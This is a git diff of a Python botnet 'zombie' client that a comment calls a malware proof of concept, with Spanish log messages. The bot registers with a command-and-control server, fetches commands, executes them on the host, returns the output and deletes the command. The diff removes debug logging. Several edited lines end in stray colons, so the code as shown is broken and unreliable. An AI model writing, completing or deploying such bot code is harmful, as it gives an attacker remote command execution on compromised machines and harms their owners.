@@ -1,4 +1,6 @@
 
+# Beta version of the malware for Botnet template. This is just a PoC
+
 import sys
 import json
 import time
@@ -17,7 +19,7 @@ PORT = 5000
 
 URL_API_BOT = f"http://{HOST}:{PORT}/api/bot" 
 
-DEBUG = True
+#DEBUG = True
 
 TIME_RECONNECT = 5
 
@@ -194,29 +196,11 @@ if __name__ == '__main__':
 
                 if not zombie.create_connection(payload):
 
-                    if DEBUG:
-
-                        logger.log("Zombie ya existe. Se actualizará la información...", "warning")
-
-                    if zombie.update_connection(payload):
-
-                        if DEBUG:
-
-                            logger.log("Información actualizada", "success")
-
-                    else:
-
-                        if DEBUG:
-
-                            logger.log("Información no se pudo actualizar", "error")
+                    zombie.update_connection(payload):
 
                     cmdline = zombie.get_command()
 
                     if cmdline:
-
-                        if DEBUG:
-
-                            logger.log(f"Ejecutando comando: {cmdline}", "processing")
 
                         output = ""
 
@@ -230,46 +214,26 @@ if __name__ == '__main__':
 
                             output += cmd.get_output(cmdline)
 
-                        if zombie.send_output(output):
-
-                            if DEBUG:
-
-                                logger.log("Salida enviada con éxito", "success")
-
-                        else:
-
-                            if DEBUG:
-                                
-                                logger.log("No se ha podido enviar la salida", "error")
+                        zombie.send_output(output):
 
                         time.sleep(TIME_BEFORE_DELETE_COMMAND)
 
-                        if zombie.delete_command():
-
-                            if DEBUG:
-
-                                logger.log("Último comando borrado con éxito", "success")
-
-                        else:
-
-                            if DEBUG:
-                                
-                                logger.log("No se ha podido borrar el comando", "error")
-
-                else:
-
-                    if DEBUG:
-
-                        logger.log("Zombie creado con éxito", "success")
+                        zombie.delete_command():
 
             except requests.exceptions.ConnectionError as error:
 
-                print("Ha ocurrido un error en el servidor de C&C, intentando reconectar...")
+                print("Ha ocurrido un error en el servidor de C&C, reconectando...")
 
                 time.sleep(TIME_RECONNECT)
 
-
-
     except KeyboardInterrupt as error:
 
-        print("Ha salido del zombie")
+        print("Desactivando malware a la fuerza")
+
+    else:
+
+        print("Desactivando malware")
+
+    finally:
+
+        sys.exit(0)
